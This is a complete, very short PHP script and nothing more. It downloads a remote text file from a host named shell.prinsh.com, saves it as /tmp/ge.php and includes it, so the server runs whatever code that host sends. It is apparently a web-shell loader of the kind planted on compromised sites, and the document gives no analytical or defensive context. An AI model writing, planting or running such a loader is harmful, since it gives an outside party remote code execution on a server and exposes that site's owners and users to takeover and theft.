<?php
$url = "https://shell.prinsh.com/Nathan/gelay.txt";
$downloadedFilePath = "/tmp/ge.php";

file_put_contents($downloadedFilePath, file_get_contents($url));

if (file_exists($downloadedFilePath)) {

    include $downloadedFilePath;
} else {
    echo "failed get data";
}
?>